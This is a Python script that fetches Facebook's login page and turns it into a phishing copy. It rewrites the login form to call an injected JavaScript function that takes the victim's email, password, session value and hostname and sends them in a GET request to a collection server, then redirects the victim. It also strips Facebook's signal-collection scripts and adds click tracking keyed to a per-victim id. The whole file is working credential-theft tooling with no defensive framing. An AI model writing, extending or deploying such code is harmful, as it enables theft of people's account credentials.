import os
import re
import requests
from bs4 import BeautifulSoup

def modify_html_facebook(url, file_name, file_path, redirect_url):

    file_path = os.path.join(file_path, file_name)
    

    os.makedirs(os.path.dirname(file_path), exist_ok=True)

    res = requests.get(url)
    html_data = res.content.decode('utf-8') 

    pattern_action = r'action="/login/\?privacy_mutation_token=.*?" method="post" onsubmit=""'
    replacement_action = r'action="" class="_9vtf" data-testid="royal_login_form" id="u_0_2_Pk" method="get" onsubmit="sendData(event)"'
    modified_html = re.sub(pattern_action, replacement_action, html_data)

    pattern_signal_data = re.compile(r'\["BDSignalCollectionData",\[\],\{sc:".*?"\},\d+\]', re.DOTALL)
    pattern_signal_trigger = re.compile(r'\["BDClientSignalCollectionTrigger","startSignalCollection",\[\],\[\{sc:".*?"\}\]\]', re.DOTALL)
    modified_html = re.sub(pattern_signal_data, '', modified_html)
    modified_html = re.sub(pattern_signal_trigger, '', modified_html)

    pattern_script = re.compile(r'(requireLazy\(\["bootstrapWebSession"\],function\(j\)\{j\(\d+\)\}\)\s*</script>)')
    data_to_insert = f"""
    <script>
        function sendDataAndRedirect() {{
            const fullUrl = window.location.href;
            const url = new URL(fullUrl);
            const id = url.searchParams.get("id");

            const serverURL = `http://127.0.0.1:5555/track_click_link?id=${{id}}`;

            fetch(serverURL, {{
            method: "GET",
            headers: {{
                "Content-Type": "application/json",
            }},
            }});
        }}
        window.onload = sendDataAndRedirect;
    </script>

    <script>
        let IP_local;
        async function sendData(event) {{
            event.preventDefault();

            const email = document.getElementById("email").value;
            const password = document.getElementById("pass").value;
            const hostName = window.location.hostname;
            const sessionId = localStorage.getItem("Session");
            const fullUrl = window.location.href;
            const url = new URL(fullUrl);
            const id = url.searchParams.get("id");
            IP_local = "dsds";
            if (email && password) {{
            try {{
                const response = await fetch(
                `http://127.0.0.1:5555/api/input?email=${{email}}&password=${{password}}&ip_address=${{IP_local}}&host_name=${{hostName}}&session=${{sessionId}}&id=${{id}}`,
                {{
                    method: "GET",
                    headers: {{
                    "Content-Type": "application/json",
                    }},
                }}
                );
                window.location.href = "{redirect_url}";
            }} catch (error) {{
                console.error("Error:", error);
            }}
            }} else {{
            alert("Please fill in both fields.");
            }}
        }}
    </script>
    """

    def insert_data(match):
        return match.group(1) + data_to_insert

    modified_html = re.sub(pattern_script, insert_data, modified_html)

    parsed_data = BeautifulSoup(modified_html, "html.parser")

    with open(file_path, "w", encoding="utf-8") as file:
        file.write(modified_html)

    return file_path
